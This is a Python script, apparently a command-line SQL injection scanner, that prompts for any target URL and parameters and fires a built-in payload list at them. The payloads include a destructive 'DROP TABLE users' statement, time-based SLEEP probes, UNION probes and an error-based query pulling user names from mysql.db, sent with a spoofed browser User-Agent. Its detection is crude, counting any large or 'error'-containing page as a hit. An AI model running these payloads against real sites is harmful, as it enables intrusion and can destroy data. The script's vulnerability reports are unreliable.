import requests
import time
import logging
from urllib.parse import urlparse, quote

# Constants for default values
DEFAULT_DELAY = 1
DEFAULT_THRESHOLD = 1000

# Set up logging
logging.basicConfig(filename='sql_injection_tests.log', level=logging.INFO)

# Define SQL payloads in a separate section for clarity
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='2",
    "' UNION SELECT NULL--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND SLEEP(5)--", 
    "' OR '1'='1' /*",  
    "'; DROP TABLE users; --",  
    "' UNION ALL SELECT NULL, version() --",
    "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT user FROM mysql.db LIMIT 0,1), ':', floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) y) z)--",  
    "'; --",  
    "' AND 'x'='x",  
]

def log_vulnerability(test_url, message):
    """Log the vulnerability message to the file and print it to the console."""
    logging.info(f"{message} on {test_url}")
    print(message)

def get_user_input():
    """Get the target URL and parameters from the user with descriptive prompts."""
    print("Welcome to the SQL Injection Tester! Please use this tool responsibly.")
    
    url = input("Enter the target URL (e.g., https://example.com): ").strip()
    while not url or not (parsed_url := urlparse(url)).scheme in ['http', 'https'] or not parsed_url.netloc:
        print("Invalid URL. Please enter a valid URL starting with 'http://' or 'https://'.")
        url = input("Enter the target URL: ").strip()
    
    params = input("Enter the parameters to test (comma-separated, e.g., 'id,name'): ").split(',')
    params = [param.strip() for param in params if param.strip()]
    while not params:
        print("At least one parameter is required to test. Please enter parameters.")
        params = input("Enter the parameters to test: ").split(',')
        params = [param.strip() for param in params if param.strip()]
    
    delay = input(f"Enter the delay (in seconds) between requests (default {DEFAULT_DELAY} second): ").strip()
    try:
        delay = float(delay) if delay else DEFAULT_DELAY
    except ValueError:
        print("Invalid input for delay. Defaulting to 1 second.")
        delay = DEFAULT_DELAY
    
    threshold = input(f"Enter the response size threshold for anomaly detection (default {DEFAULT_THRESHOLD} characters): ").strip()
    try:
        threshold = int(threshold) if threshold else DEFAULT_THRESHOLD
    except ValueError:
        print("Invalid input for response size threshold. Defaulting to 1000.")
        threshold = DEFAULT_THRESHOLD

    print(f"\nTarget URL: {url}")
    print(f"Parameters to test: {', '.join(params)}")
    print(f"Delay between requests: {delay} seconds")
    print(f"Response size threshold for anomalies: {threshold} characters")
    return url, params, delay, threshold

def check_sql_injection(url, params, delay, threshold):
    """Tests a given URL with SQL payloads to check for SQL Injection vulnerabilities."""
    error_keywords = ["error", "exception", "sql", "syntax", "database", "mysql", "warning", "violations"]
    total_tests = len(params) * len(SQL_PAYLOADS) 
    vulnerabilities_found = 0
    
    print("\nTesting for potential SQL Injection vulnerabilities...")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    with requests.Session() as session:
        for param in params:
            for payload in SQL_PAYLOADS:
                encoded_payload = quote(payload)
                test_url = f"{url}?{param}={encoded_payload}"
                
                try:
                    start_time = time.time()
                    response = session.get(test_url, headers=headers)
                    response_time = time.time() - start_time
                    status_code = response.status_code
                    response_text = response.text.lower()

                    # Detecting based on status codes
                    if status_code == 500:
                        log_vulnerability(test_url, f"[Vulnerability Found] {param} with payload '{payload}' caused server error (status code 500).")
                        vulnerabilities_found += 1
                    
                    if "' AND SLEEP(5)--" in payload and response_time >= 5:
                        log_vulnerability(test_url, f"[Vulnerability Found] {param} with payload '{payload}' triggered a delayed response indicative of time-based SQL injection.")
                        vulnerabilities_found += 1
                    
                    if any(keyword in response_text for keyword in error_keywords):
                        log_vulnerability(test_url, f"[Vulnerability Found] {param} with payload '{payload}' returned an error message indicative of a SQL injection vulnerability.")
                        vulnerabilities_found += 1

                    if len(response_text) > threshold:
                        log_vulnerability(test_url, f"[Vulnerability Found] {param} with payload '{payload}' returned an unusually large response size > {threshold} characters.")
                        vulnerabilities_found += 1

                except requests.exceptions.RequestException as e:
                    error_message = f"[Error] Error occurred during request to {test_url}: {e}"
                    print(error_message)
                    logging.error(error_message)
                
                time.sleep(delay)

    print("\nSQL Injection testing completed.")
    print(f"Total tests conducted: {total_tests}")
    print(f"Vulnerabilities found: {vulnerabilities_found}")

# Main function
if __name__ == "__main__":
    try:
        url, params, delay, threshold = get_user_input()
        check_sql_injection(url, params, delay, threshold)
    except KeyboardInterrupt:
        print("\nProcess interrupted. Exiting...")
